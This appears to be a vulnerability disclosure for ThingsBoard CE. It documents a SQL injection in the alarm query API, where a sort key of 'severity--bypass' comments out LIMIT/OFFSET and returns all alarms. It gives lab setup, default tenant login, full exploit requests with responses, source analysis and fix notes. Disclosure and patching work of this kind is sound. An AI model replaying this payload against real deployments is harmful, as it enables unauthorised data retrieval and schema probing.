### Vulnerability details

**Official website / Product:** https://thingsboard.io/

**Repository:** thingsboard/thingsboard (stars at selection: 23000)

**Vulnerability type:** SQLi (ORDER BY / SQL-comment truncation of LIMIT)

**Vulnerability versions:** ThingsBoard CE 4.2.1.1 (Docker-verified); same sink still present in audited master@91d1b3f603db37e0fd13a741a64b7735cff8731b (no column allowlist fix observed on this code path through latest v4.4.0.2 lineage)

**Vulnerability URL / Parameter:** `POST /api/alarmsQuery/find` → `pageLink.sortOrder.key` (`type=ALARM_FIELD`)

**Complex:** yes

### Verification procedure

1. Rebuild the lab (original `labs/thingsboard-r55-a1/` was torn down after verify). Write compose into a temp directory and start:

```bash
mkdir -p /tmp/tb-r55-a1-lab && cd /tmp/tb-r55-a1-lab
cat > docker-compose.yml <<'EOF'
# Recreated for doc-review (original labs/thingsboard-r55-a1/ torn down).
# thingsboard/tb-postgres:4.2.1.1, container tb-r55-a1, service tb,
# host 23501→9090, image id 08decb7b3671.
services:
  tb:
    image: thingsboard/tb-postgres:4.2.1.1
    container_name: tb-r55-a1
    ports:
      - "23501:9090"
    environment:
      - TB_QUEUE_TYPE=in-memory
EOF
docker compose up -d
# container tb-r55-a1; service tb; host 23501 → container 9090
# image thingsboard/tb-postgres:4.2.1.1 (IMAGE ID 08decb7b3671)
# first boot is slow (embedded Postgres init); wait until http://127.0.0.1:23501/login is reachable
```

Original `docker ps` / image record:

```text
NAME        IMAGE                             COMMAND         SERVICE   CREATED         STATUS         PORTS
tb-r55-a1   thingsboard/tb-postgres:4.2.1.1   "start-tb.sh"   tb        3 minutes ago   Up 3 minutes   5683/udp, 1883/tcp, 5685-5686/udp, 0.0.0.0:23501->9090/tcp, [::]:23501->9090/tcp
REPOSITORY                TAG       IMAGE ID       CREATED         SIZE
thingsboard/tb-postgres   4.2.1.1   08decb7b3671   10 months ago   1.47GB
```

2. Login and obtain JWT (default tenant admin `tenant@thingsboard.org` / `tenant`):

```http
POST /api/auth/login HTTP/1.1
Host: 127.0.0.1:23501
Content-Type: application/json
Accept: application/json
Connection: close

{"username":"tenant@thingsboard.org","password":"tenant"}
```

Take `token` from the JSON response and send `X-Authorization: Bearer <token>` on later requests. **JWTs embedded in the PoCs below are from the original lab capture — replace them after rebuild.**

3. Create a device and seed multiple alarms (lab evidence has 16 rows: `sqli-test` + `sqli-bulk-1`…`sqli-bulk-15`. ThingsBoard deduplicates by originator+type, so each alarm needs a unique `type`; ≥2 rows suffice to observe the pagination bypass):

```http
POST /api/device HTTP/1.1
Host: 127.0.0.1:23501
Content-Type: application/json
Accept: application/json
X-Authorization: Bearer <token>
Connection: close

{"name":"Test Device A1","type":"default"}
```

Record the device `id.id` as `DEVICE_ID`, then create alarms (example one row; vary unique `type` / `severity` for the rest):

```http
POST /api/alarm HTTP/1.1
Host: 127.0.0.1:23501
Content-Type: application/json
Accept: application/json
X-Authorization: Bearer <token>
Connection: close

{"type":"sqli-test","severity":"CRITICAL","originator":{"entityType":"DEVICE","id":"DEVICE_ID"},"startTs":1793618555000,"endTs":1793618555000}
```

4. Control: `sortOrder.key.key=createdTime` with `pageSize=1` → `data` length 1 and `hasNext=true` (PoC A below).
5. Exploit: set `sortOrder.key.key` to `severity--bypass` with the same `pageSize=1` → all matching alarms returned (16 in this lab, `rows==totalElements`), proving same-statement `DESC limit/offset` was SQL-commented out (PoC B below).

### Complete vulnerability PoC

#### PoC A — control (mapped sort key; pagination honored)

Complete HTTP request (same endpoint/`pageSize=1` as the exploit; only `sortOrder.key.key=createdTime`):

```http
POST /api/alarmsQuery/find HTTP/1.1
Host: 127.0.0.1:23501
Content-Type: application/json
Accept: application/json
X-Authorization: Bearer <token>
Connection: close

{"entityFilter":{"type":"entityType","entityType":"DEVICE"},"pageLink":{"page":0,"pageSize":1,"textSearch":null,"searchPropagatedAlarms":false,"statusList":[],"severityList":[],"typeList":[],"sortOrder":{"key":{"type":"ALARM_FIELD","key":"createdTime"},"direction":"DESC"}},"keyFilters":[],"alarmFields":[{"type":"ALARM_FIELD","key":"createdTime"},{"type":"ALARM_FIELD","key":"type"},{"type":"ALARM_FIELD","key":"severity"}],"entityFields":[{"type":"ENTITY_FIELD","key":"name"}],"latestValues":[]}
```

Complete HTTP response highlights (exactly one `data` row):

```http
HTTP/1.1 200
Content-Type: application/json

{"data":[{"entityId":{"entityType":"DEVICE","id":"8061a5e0-d6af-11f1-8d79-7bead8cf2642"},"latest":{"ENTITY_FIELD":{"name":{"ts":1793618632133,"value":"Test Device A1"}}},"id":{"entityType":"ALARM","id":"4087081a-b7b7-43e1-8f72-54b9d5d9e68b"},"createdTime":1793618582062,"tenantId":{"entityType":"TENANT","id":"7fbf4b60-d6af-11f1-8d79-7bead8cf2642"},"customerId":{"entityType":"CUSTOMER","id":"8022ef30-d6af-11f1-8d79-7bead8cf2642"},"type":"sqli-bulk-15","originator":{"entityType":"DEVICE","id":"8061a5e0-d6af-11f1-8d79-7bead8cf2642"},"severity":"MAJOR","acknowledged":false,"cleared":false,"assigneeId":null,"startTs":1793618567000,"endTs":1793618567000,"ackTs":0,"clearTs":0,"assignTs":0,"propagate":false,"propagateToOwner":false,"propagateToTenant":false,"propagateRelationTypes":[],"originatorName":"Test Device A1","originatorLabel":"Test Device A1","assignee":null,"name":"sqli-bulk-15","status":"ACTIVE_UNACK","details":{}}],"totalPages":16,"totalElements":16,"hasNext":true}
```

#### PoC B — exploit (`severity--bypass` comments out LIMIT)

Complete HTTP request (Docker-verified; refresh JWT before replay):

```http
POST /api/alarmsQuery/find HTTP/1.1
Host: 127.0.0.1:23501
Content-Type: application/json
Accept: application/json
X-Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJ0ZW5hbnRAdGhpbmdzYm9hcmQub3JnIiwidXNlcklkIjoiODAxOTUyNDAtZDZhZi0xMWYxLThkNzktN2JlYWQ4Y2YyNjQyIiwic2NvcGVzIjpbIlRFTkFOVF9BRE1JTiJdLCJzZXNzaW9uSWQiOiJjNDgzZGViYi02NTU1LTQ2MTgtOTViNC1mY2UyZGM1NTk3OGIiLCJleHAiOjE3OTM2Mjc2MzIsImlzcyI6InRoaW5nc2JvYXJkLmlvIiwiaWF0IjoxNzkzNjE4NjMyLCJlbmFibGVkIjp0cnVlLCJpc1B1YmxpYyI6ZmFsc2UsInRlbmFudElkIjoiN2ZiZjRiNjAtZDZhZi0xMWYxLThkNzktN2JlYWQ4Y2YyNjQyIiwiY3VzdG9tZXJJZCI6IjEzODE0MDAwLTFkZDItMTFiMi04MDgwLTgwODA4MDgwODA4MCJ9.jEeEh80AGlrdSEjoZ__HgAI6MLImrEXBhaE04eY9-fVaws_DtxWojCkNibHGcS_scq_MJeRKLR3VJHpEj7A1LA
Content-Length: 502
Connection: close

{"entityFilter":{"type":"entityType","entityType":"DEVICE"},"pageLink":{"page":0,"pageSize":1,"textSearch":null,"searchPropagatedAlarms":false,"statusList":[],"severityList":[],"typeList":[],"sortOrder":{"key":{"type":"ALARM_FIELD","key":"severity--bypass"},"direction":"DESC"}},"keyFilters":[],"alarmFields":[{"type":"ALARM_FIELD","key":"createdTime"},{"type":"ALARM_FIELD","key":"type"},{"type":"ALARM_FIELD","key":"severity"}],"entityFields":[{"type":"ENTITY_FIELD","key":"name"}],"latestValues":[]}
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Content-Type: application/json
Transfer-Encoding: chunked
Date: Mon, 02 Nov 2026 11:23:52 GMT

{"data":[{"entityId":{"entityType":"DEVICE","id":"8061a5e0-d6af-11f1-8d79-7bead8cf2642"},"latest":{"ENTITY_FIELD":{"name":{"ts":1793618632087,"value":"Test Device A1"}}},"id":{"entityType":"ALARM","id":"a5779e4d-9d0d-4576-82b8-15f159bd444a"},"createdTime":1793618555407,"tenantId":{"entityType":"TENANT","id":"7fbf4b60-d6af-11f1-8d79-7bead8cf2642"},"customerId":{"entityType":"CUSTOMER","id":"8022ef30-d6af-11f1-8d79-7bead8cf2642"},"type":"sqli-test","originator":{"entityType":"DEVICE","id":"8061a5e0-d6af-11f1-8d79-7bead8cf2642"},"severity":"CRITICAL","acknowledged":false,"cleared":false,"assigneeId":null,"startTs":1793618555000,"endTs":1793618555000,"ackTs":0,"clearTs":0,"assignTs":0,"propagate":false,"propagateToOwner":false,"propagateToTenant":false,"propagateRelationTypes":[],"originatorName":"Test Device A1","originatorLabel":"Test Device A1","assignee":null,"name":"sqli-test","status":"ACTIVE_UNACK","details":{}},{"entityId":{"entityType":"DEVICE","id":"8061a5e0-d6af-11f1-8d79-7bead8cf2642"},"latest":{"ENTITY_FIELD":{"name":{"ts":1793618632087,"value":"Test Device A1"}}},"id":{"entityType":"ALARM","id":"20e0e6f1-5af3-452c-bd69-beb368ded2a0"},"createdTime":1793618581662,"tenantId":{"entityType":"TENANT","id":"7fbf4b60-d6af-11f1-8d79-7bead8cf2642"},"customerId":{"entityType":"CUSTOMER","id":"8022ef30-d6af-11f1-8d79-7bead8cf2642"},"type":"sqli-bulk-1","originator":{"entityType":"DEVICE","id":"8061a5e0-d6af-11f1-8d79-7bead8cf2642"},"severity":"MAJOR","acknowledged":false,"cleared":false,"assigneeId":null,"startTs":1793618580000,"endTs":1793618580000,"ackTs":0,"clearTs":0,"assignTs":0,"propagate":false,"propagateToOwner":false,"propagateToTenant":false,"propagateRelationTypes":[],"originatorName":"Test Device A1","originatorLabel":"Test Device A1","assignee":null,"name":"sqli-bulk-1","status":"ACTIVE_UNACK","details":{}},{"entityId":{"entityType":"DEVICE","id":"8061a5e0-d6af-11f1-8d79-7bead8cf2642"},"latest":{"ENTITY_FIELD":{"name":{"ts":1793618632087,"value":"Test Device A1"}}},"id":{"entityType":"ALARM","id":"9084ee2f-0b44-4d78-88c5-a40e58b5b073"},"createdTime":1793618581694,"tenantId":{"entityType":"TENANT","id":"7fbf4b60-d6af-11f1-8d79-7bead8cf2642"},"customerId":{"entityType":"CUSTOMER","id":"8022ef30-d6af-11f1-8d79-7bead8cf2642"},"type":"sqli-bulk-2","originator":{"entityType":"DEVICE","id":"8061a5e0-d6af-11f1-8d79-7bead8cf2642"},"severity":"MAJOR","acknowledged":false,"cleared":false,"assigneeId":null,"startTs":1793618579000,"endTs":1793618579000,"ackTs":0,"clearTs":0,"assignTs":0,"propagate":false,"propagateToOwner":false,"propagateToTenant":false,"propagateRelationTypes":[],"originatorName":"Test Device A1","originatorLabel":"Test Device A1","assignee":null,"name":"sqli-bulk-2","status":"ACTIVE_UNACK","details":{}},{"entityId":{"entityType":"DEVICE","id":"8061a5e0-d6af-11f1-8d79-7bead8cf2642"},"latest":{"ENTITY_FIELD":{"name":{"ts":1793618632087,"value":"Test Device A1"}}},"id":{"entityType":"ALARM","id":"a51a4ccd-19cd-4981-8264-08702219652f"},"createdTime":1793618581719,"tenantId":{"entityType":"TENANT","id":"7fbf4b60-d6af-11f1-8d79-7bead8cf2642"},"customerId":{"entityType":"CUSTOMER","id":"8022ef30-d6af-11f1-8d79-7bead8cf2642"},"type":"sqli-bulk-3","originator":{"entityType":"DEVICE","id":"8061a5e0-d6af-11f1-8d79-7bead8cf2642"},"severity":"MAJOR","acknowledged":false,"cleared":false,"assigneeId":null,"startTs":1793618578000,"endTs":1793618578000,"ackTs":0,"clearTs":0,"assignTs":0,"propagate":false,"propagateToOwner":false,"propagateToTenant":false,"propagateRelationTypes":[],"originatorName":"Test Device A1","originatorLabel":"Test Device A1","assignee":null,"name":"sqli-bulk-3","status":"ACTIVE_UNACK","details":{}},{"entityId":{"entityType":"DEVICE","id":"8061a5e0-d6af-11f1-8d79-7bead8cf2642"},"latest":{"ENTITY_FIELD":{"name":{"ts":1793618632087,"value":"Test Device A1"}}},"id":{"entityType":"ALARM","id":"c5cd4e4d-1f87-4fe9-a8b5-249599fc2f9a"},"createdTime":1793618581756,"tenantId":{"entityType":"TENANT","id":"7fbf4b60-d6af-11f1-8d79-7bead8cf2642"},"customerId":{"entityType":"CUSTOMER","id":"8022ef30-d6af-11f1-8d79-7bead8cf2642"},"type":"sqli-bulk-4","originator":{"entityType":"DEVICE","id":"8061a5e0-d6af-11f1-8d79-7bead8cf2642"},"severity":"MAJOR","acknowledged":false,"cleared":false,"assigneeId":null,"startTs":1793618577000,"endTs":1793618577000,"ackTs":0,"clearTs":0,"assignTs":0,"propagate":false,"propagateToOwner":false,"propagateToTenant":false,"propagateRelationTypes":[],"originatorName":"Test Device A1","originatorLabel":"Test Device A1","assignee":null,"name":"sqli-bulk-4","status":"ACTIVE_UNACK","details":{}},{"entityId":{"entityType":"DEVICE","id":"8061a5e0-d6af-11f1-8d79-7bead8cf2642"},"latest":{"ENTITY_FIELD":{"name":{"ts":1793618632087,"value":"Test Device A1"}}},"id":{"entityType":"ALARM","id":"c7c11acf-b02c-43dd-8a5d-d22b47f2acb3"},"createdTime":1793618581796,"tenantId":{"entityType":"TENANT","id":"7fbf4b60-d6af-11f1-8d79-7bead8cf2642"},"customerId":{"entityType":"CUSTOMER","id":"8022ef30-d6af-11f1-8d79-7bead8cf2642"},"type":"sqli-bulk-5","originator":{"entityType":"DEVICE","id":"8061a5e0-d6af-11f1-8d79-7bead8cf2642"},"severity":"MAJOR","acknowledged":false,"cleared":false,"assigneeId":null,"startTs":1793618576000,"endTs":1793618576000,"ackTs":0,"clearTs":0,"assignTs":0,"propagate":false,"propagateToOwner":false,"propagateToTenant":false,"propagateRelationTypes":[],"originatorName":"Test Device A1","originatorLabel":"Test Device A1","assignee":null,"name":"sqli-bulk-5","status":"ACTIVE_UNACK","details":{}},{"entityId":{"entityType":"DEVICE","id":"8061a5e0-d6af-11f1-8d79-7bead8cf2642"},"latest":{"ENTITY_FIELD":{"name":{"ts":1793618632087,"value":"Test Device A1"}}},"id":{"entityType":"ALARM","id":"89c9ae29-924b-49f7-b299-0215095b196f"},"createdTime":1793618581829,"tenantId":{"entityType":"TENANT","id":"7fbf4b60-d6af-11f1-8d79-7bead8cf2642"},"customerId":{"entityType":"CUSTOMER","id":"8022ef30-d6af-11f1-8d79-7bead8cf2642"},"type":"sqli-bulk-6","originator":{"entityType":"DEVICE","id":"8061a5e0-d6af-11f1-8d79-7bead8cf2642"},"severity":"MAJOR","acknowledged":false,"cleared":false,"assigneeId":null,"startTs":1793618575000,"endTs":1793618575000,"ackTs":0,"clearTs":0,"assignTs":0,"propagate":false,"propagateToOwner":false,"propagateToTenant":false,"propagateRelationTypes":[],"originatorName":"Test Device A1","originatorLabel":"Test Device A1","assignee":null,"name":"sqli-bulk-6","status":"ACTIVE_UNACK","details":{}},{"entityId":{"entityType":"DEVICE","id":"8061a5e0-d6af-11f1-8d79-7bead8cf2642"},"latest":{"ENTITY_FIELD":{"name":{"ts":1793618632087,"value":"Test Device A1"}}},"id":{"entityType":"ALARM","id":"57af572e-879a-4f37-8dc2-78fb8483d6c1"},"createdTime":1793618581856,"tenantId":{"entityType":"TENANT","id":"7fbf4b60-d6af-11f1-8d79-7bead8cf2642"},"customerId":{"entityType":"CUSTOMER","id":"8022ef30-d6af-11f1-8d79-7bead8cf2642"},"type":"sqli-bulk-7","originator":{"entityType":"DEVICE","id":"8061a5e0-d6af-11f1-8d79-7bead8cf2642"},"severity":"MAJOR","acknowledged":false,"cleared":false,"assigneeId":null,"startTs":1793618574000,"endTs":1793618574000,"ackTs":0,"clearTs":0,"assignTs":0,"propagate":false,"propagateToOwner":false,"propagateToTenant":false,"propagateRelationTypes":[],"originatorName":"Test Device A1","originatorLabel":"Test Device A1","assignee":null,"name":"sqli-bulk-7","status":"ACTIVE_UNACK","details":{}},{"entityId":{"entityType":"DEVICE","id":"8061a5e0-d6af-11f1-8d79-7bead8cf2642"},"latest":{"ENTITY_FIELD":{"name":{"ts":1793618632087,"value":"Test Device A1"}}},"id":{"entityType":"ALARM","id":"bb075420-2029-45e8-8765-b9574e99b7f2"},"createdTime":1793618581876,"tenantId":{"entityType":"TENANT","id":"7fbf4b60-d6af-11f1-8d79-7bead8cf2642"},"customerId":{"entityType":"CUSTOMER","id":"8022ef30-d6af-11f1-8d79-7bead8cf2642"},"type":"sqli-bulk-8","originator":{"entityType":"DEVICE","id":"8061a5e0-d6af-11f1-8d79-7bead8cf2642"},"severity":"MAJOR","acknowledged":false,"cleared":false,"assigneeId":null,"startTs":1793618573000,"endTs":1793618573000,"ackTs":0,"clearTs":0,"assignTs":0,"propagate":false,"propagateToOwner":false,"propagateToTenant":false,"propagateRelationTypes":[],"originatorName":"Test Device A1","originatorLabel":"Test Device A1","assignee":null,"name":"sqli-bulk-8","status":"ACTIVE_UNACK","details":{}},{"entityId":{"entityType":"DEVICE","id":"8061a5e0-d6af-11f1-8d79-7bead8cf2642"},"latest":{"ENTITY_FIELD":{"name":{"ts":1793618632087,"value":"Test Device A1"}}},"id":{"entityType":"ALARM","id":"678863ea-6336-4afc-af18-3234e1576571"},"createdTime":1793618581900,"tenantId":{"entityType":"TENANT","id":"7fbf4b60-d6af-11f1-8d79-7bead8cf2642"},"customerId":{"entityType":"CUSTOMER","id":"8022ef30-d6af-11f1-8d79-7bead8cf2642"},"type":"sqli-bulk-9","originator":{"entityType":"DEVICE","id":"8061a5e0-d6af-11f1-8d79-7bead8cf2642"},"severity":"MAJOR","acknowledged":false,"cleared":false,"assigneeId":null,"startTs":1793618572000,"endTs":1793618572000,"ackTs":0,"clearTs":0,"assignTs":0,"propagate":false,"propagateToOwner":false,"propagateToTenant":false,"propagateRelationTypes":[],"originatorName":"Test Device A1","originatorLabel":"Test Device A1","assignee":null,"name":"sqli-bulk-9","status":"ACTIVE_UNACK","details":{}},{"entityId":{"entityType":"DEVICE","id":"8061a5e0-d6af-11f1-8d79-7bead8cf2642"},"latest":{"ENTITY_FIELD":{"name":{"ts":1793618632087,"value":"Test Device A1"}}},"id":{"entityType":"ALARM","id":"5089a464-6872-4ecb-b7bc-1a2970f55ac1"},"createdTime":1793618581922,"tenantId":{"entityType":"TENANT","id":"7fbf4b60-d6af-11f1-8d79-7bead8cf2642"},"customerId":{"entityType":"CUSTOMER","id":"8022ef30-d6af-11f1-8d79-7bead8cf2642"},"type":"sqli-bulk-10","originator":{"entityType":"DEVICE","id":"8061a5e0-d6af-11f1-8d79-7bead8cf2642"},"severity":"MAJOR","acknowledged":false,"cleared":false,"assigneeId":null,"startTs":1793618571000,"endTs":1793618571000,"ackTs":0,"clearTs":0,"assignTs":0,"propagate":false,"propagateToOwner":false,"propagateToTenant":false,"propagateRelationTypes":[],"originatorName":"Test Device A1","originatorLabel":"Test Device A1","assignee":null,"name":"sqli-bulk-10","status":"ACTIVE_UNACK","details":{}},{"entityId":{"entityType":"DEVICE","id":"8061a5e0-d6af-11f1-8d79-7bead8cf2642"},"latest":{"ENTITY_FIELD":{"name":{"ts":1793618632087,"value":"Test Device A1"}}},"id":{"entityType":"ALARM","id":"8ef27024-29b4-46aa-addd-325102d38052"},"createdTime":1793618581947,"tenantId":{"entityType":"TENANT","id":"7fbf4b60-d6af-11f1-8d79-7bead8cf2642"},"customerId":{"entityType":"CUSTOMER","id":"8022ef30-d6af-11f1-8d79-7bead8cf2642"},"type":"sqli-bulk-11","originator":{"entityType":"DEVICE","id":"8061a5e0-d6af-11f1-8d79-7bead8cf2642"},"severity":"MAJOR","acknowledged":false,"cleared":false,"assigneeId":null,"startTs":1793618570000,"endTs":1793618570000,"ackTs":0,"clearTs":0,"assignTs":0,"propagate":false,"propagateToOwner":false,"propagateToTenant":false,"propagateRelationTypes":[],"originatorName":"Test Device A1","originatorLabel":"Test Device A1","assignee":null,"name":"sqli-bulk-11","status":"ACTIVE_UNACK","details":{}},{"entityId":{"entityType":"DEVICE","id":"8061a5e0-d6af-11f1-8d79-7bead8cf2642"},"latest":{"ENTITY_FIELD":{"name":{"ts":1793618632087,"value":"Test Device A1"}}},"id":{"entityType":"ALARM","id":"24d979a1-b07d-426a-8319-d267045796b9"},"createdTime":1793618581969,"tenantId":{"entityType":"TENANT","id":"7fbf4b60-d6af-11f1-8d79-7bead8cf2642"},"customerId":{"entityType":"CUSTOMER","id":"8022ef30-d6af-11f1-8d79-7bead8cf2642"},"type":"sqli-bulk-12","originator":{"entityType":"DEVICE","id":"8061a5e0-d6af-11f1-8d79-7bead8cf2642"},"severity":"MAJOR","acknowledged":false,"cleared":false,"assigneeId":null,"startTs":1793618569000,"endTs":1793618569000,"ackTs":0,"clearTs":0,"assignTs":0,"propagate":false,"propagateToOwner":false,"propagateToTenant":false,"propagateRelationTypes":[],"originatorName":"Test Device A1","originatorLabel":"Test Device A1","assignee":null,"name":"sqli-bulk-12","status":"ACTIVE_UNACK","details":{}},{"entityId":{"entityType":"DEVICE","id":"8061a5e0-d6af-11f1-8d79-7bead8cf2642"},"latest":{"ENTITY_FIELD":{"name":{"ts":1793618632087,"value":"Test Device A1"}}},"id":{"entityType":"ALARM","id":"78c19ca2-7955-4c7e-8616-ce7e5e792c6f"},"createdTime":1793618581991,"tenantId":{"entityType":"TENANT","id":"7fbf4b60-d6af-11f1-8d79-7bead8cf2642"},"customerId":{"entityType":"CUSTOMER","id":"8022ef30-d6af-11f1-8d79-7bead8cf2642"},"type":"sqli-bulk-13","originator":{"entityType":"DEVICE","id":"8061a5e0-d6af-11f1-8d79-7bead8cf2642"},"severity":"MAJOR","acknowledged":false,"cleared":false,"assigneeId":null,"startTs":1793618568000,"endTs":1793618568000,"ackTs":0,"clearTs":0,"assignTs":0,"propagate":false,"propagateToOwner":false,"propagateToTenant":false,"propagateRelationTypes":[],"originatorName":"Test Device A1","originatorLabel":"Test Device A1","assignee":null,"name":"sqli-bulk-13","status":"ACTIVE_UNACK","details":{}},{"entityId":{"entityType":"DEVICE","id":"8061a5e0-d6af-11f1-8d79-7bead8cf2642"},"latest":{"ENTITY_FIELD":{"name":{"ts":1793618632087,"value":"Test Device A1"}}},"id":{"entityType":"ALARM","id":"aab56efb-248d-4ca5-b403-6c24e8b676a2"},"createdTime":1793618582030,"tenantId":{"entityType":"TENANT","id":"7fbf4b60-d6af-11f1-8d79-7bead8cf2642"},"customerId":{"entityType":"CUSTOMER","id":"8022ef30-d6af-11f1-8d79-7bead8cf2642"},"type":"sqli-bulk-14","originator":{"entityType":"DEVICE","id":"8061a5e0-d6af-11f1-8d79-7bead8cf2642"},"severity":"MAJOR","acknowledged":false,"cleared":false,"assigneeId":null,"startTs":1793618568000,"endTs":1793618568000,"ackTs":0,"clearTs":0,"assignTs":0,"propagate":false,"propagateToOwner":false,"propagateToTenant":false,"propagateRelationTypes":[],"originatorName":"Test Device A1","originatorLabel":"Test Device A1","assignee":null,"name":"sqli-bulk-14","status":"ACTIVE_UNACK","details":{}},{"entityId":{"entityType":"DEVICE","id":"8061a5e0-d6af-11f1-8d79-7bead8cf2642"},"latest":{"ENTITY_FIELD":{"name":{"ts":1793618632087,"value":"Test Device A1"}}},"id":{"entityType":"ALARM","id":"4087081a-b7b7-43e1-8f72-54b9d5d9e68b"},"createdTime":1793618582062,"tenantId":{"entityType":"TENANT","id":"7fbf4b60-d6af-11f1-8d79-7bead8cf2642"},"customerId":{"entityType":"CUSTOMER","id":"8022ef30-d6af-11f1-8d79-7bead8cf2642"},"type":"sqli-bulk-15","originator":{"entityType":"DEVICE","id":"8061a5e0-d6af-11f1-8d79-7bead8cf2642"},"severity":"MAJOR","acknowledged":false,"cleared":false,"assigneeId":null,"startTs":1793618567000,"endTs":1793618567000,"ackTs":0,"clearTs":0,"assignTs":0,"propagate":false,"propagateToOwner":false,"propagateToTenant":false,"propagateRelationTypes":[],"originatorName":"Test Device A1","originatorLabel":"Test Device A1","assignee":null,"name":"sqli-bulk-15","status":"ACTIVE_UNACK","details":{}}],"totalPages":16,"totalElements":16,"hasNext":false}
```

Verification result notes:

- Control `pageSize=1` → `rows=1` (`hasNext=true`); exploit same `pageSize=1` → `rows=16` (= `totalElements`).
- Comparison summary from the original lab:

```text
pageSize requested=1
rows returned=16
totalElements=16
IMPACT: SQL comment in sort key comments out DESC/LIMIT/OFFSET; returns ALL matching alarms
Compare: benign pageSize=1 returns 1 row; payload returns 16 rows
```

- PostgreSQL logs show unmapped identifiers concatenated into `order by` (e.g. `order by nonexistent_col_xyz DESC`).
- `severity--bypass` misses `alarmFieldColumnMap`; PostgreSQL parses the concatenated identifier as column `severity` plus line comment `--bypass DESC limit 1 offset 0`, bypassing pagination.

### Vulnerability analysis

`DefaultAlarmQueryRepository.findAlarmDataByQueryForEntities` builds native SQL `ORDER BY` via `alarmFieldColumnMap.getOrDefault(sortOrderKey, sortOrderKey)`, then appends `sortPart` and `limit N offset M` onto the same `dataQuery` string (~L309–313). Unmapped keys fall back to attacker-controlled identifiers.

`Validator.validateEntityDataPageLink` only enforces charset regex `PROPERTY_PATTERN = ^[\p{L}0-9_-]+$`, which **permits hyphen `-`**. Thus `severity--bypass` passes validation. Key `severity--bypass` ≠ map key `severity`, so `getOrDefault` returns the raw string. In PostgreSQL, `--` starts a comment to end-of-line, truncating `DESC`/`LIMIT`/`OFFSET` on the same statement. Impact: pagination bypass / oversized alarm result sets; also a column-existence oracle (mapped/existing column → 200; missing → 500 Database error).

Auth: `TENANT_ADMIN` / `CUSTOMER_USER` (authenticated); not anonymous.
Trigger / sink source (full path and line numbers):

```java
# File: dao/src/main/java/org/thingsboard/server/dao/sql/query/DefaultAlarmQueryRepository.java
# Lines: 146-182
            StringBuilder sortPart = new StringBuilder(" order by ");
            StringBuilder joinPart = new StringBuilder();
            boolean addAnd = false;
            if (pageLink.isSearchPropagatedAlarms()) {
                selectPart.append(" ea.entity_id as entity_id ");
                fromPart.append(JOIN_ENTITY_ALARMS);
                wherePart.append(buildPermissionsQuery(tenantId, ctx, mergedUserPermissions));
                addAnd = true;
            } else {
                selectPart.append(" a.originator_id as entity_id ");
            }
            EntityDataSortOrder sortOrder = pageLink.getSortOrder();

            if (sortOrder != null && EntityKeyType.ALARM_FIELD.equals(sortOrder.getKey().getType()) && ASSIGNEE_KEY.equalsIgnoreCase(sortOrder.getKey().getKey())) {
                sortOrder = new EntityDataSortOrder(new EntityKey(EntityKeyType.ALARM_FIELD, ASSIGNEE_EMAIL_KEY), sortOrder.getDirection());
            }

            List<EntityKey> alarmFields = new ArrayList<>();
            for (EntityKey key : query.getAlarmFields()) {
                if (EntityKeyType.ALARM_FIELD.equals(key.getType()) && ASSIGNEE_KEY.equalsIgnoreCase(key.getKey())) {
                    alarmFields.add(new EntityKey(EntityKeyType.ALARM_FIELD, ASSIGNEE_ID_KEY));
                    alarmFields.add(new EntityKey(EntityKeyType.ALARM_FIELD, ASSIGNEE_FIRST_NAME_KEY));
                    alarmFields.add(new EntityKey(EntityKeyType.ALARM_FIELD, ASSIGNEE_LAST_NAME_KEY));
                    alarmFields.add(new EntityKey(EntityKeyType.ALARM_FIELD, ASSIGNEE_EMAIL_KEY));
                } else {
                    alarmFields.add(key);
                }
            }

            String textSearchQuery = buildTextSearchQuery(ctx, alarmFields, pageLink.getTextSearch());
            if (sortOrder != null && sortOrder.getKey().getType().equals(EntityKeyType.ALARM_FIELD)) {
                String sortOrderKey = sortOrder.getKey().getKey();
                if ("status".equalsIgnoreCase(sortOrderKey)) {
                    selectPart.append(", a.status as status ");
                }
                sortPart.append(alarmFieldColumnMap.getOrDefault(sortOrderKey, sortOrderKey))
                        .append(" ").append(sortOrder.getDirection().name());
```

```java
# File: dao/src/main/java/org/thingsboard/server/dao/service/Validator.java
# Lines: 26, 283-301
    public static final Pattern PROPERTY_PATTERN = Pattern.compile("^[\\p{L}0-9_-]+$"); // Unicode letters, numbers, '_' and '-' allowed

    public static void validateEntityDataPageLink(EntityDataPageLink pageLink) {
        if (pageLink == null) {
            throw new IncorrectParameterException("Entity Data Page link must be specified.");
        } else if (pageLink.getPageSize() < 1) {
            throw new IncorrectParameterException("Incorrect entity data page link page size '" + pageLink.getPageSize() + "'. Page size must be greater than zero.");
        } else if (pageLink.getPage() < 0) {
            throw new IncorrectParameterException("Incorrect entity data page link page '" + pageLink.getPage() + "'. Page must be positive integer.");
        } else if (pageLink.getSortOrder() != null && pageLink.getSortOrder().getKey() != null) {
            EntityKey sortKey = pageLink.getSortOrder().getKey();
            if ((sortKey.getType() == EntityKeyType.ENTITY_FIELD || sortKey.getType() == EntityKeyType.ALARM_FIELD)
                    && !isValidProperty(sortKey.getKey())) {
                throw new IncorrectParameterException("Invalid entity data page link sort property");
            }
        }
    }

    public static boolean isValidProperty(String key) {
        return StringUtils.isEmpty(key) || RegexUtils.matches(key, PROPERTY_PATTERN);
    }
```

### Fix notes

1. Allowlist `ALARM_FIELD` sort keys strictly to `alarmFieldColumnMap` keys; never `getOrDefault` back to raw input.
2. Remove `-` from `PROPERTY_PATTERN`, or explicitly reject `--` / consecutive hyphens.
3. Concatenate only mapped constant column names into `ORDER BY`; keep direction as enum.
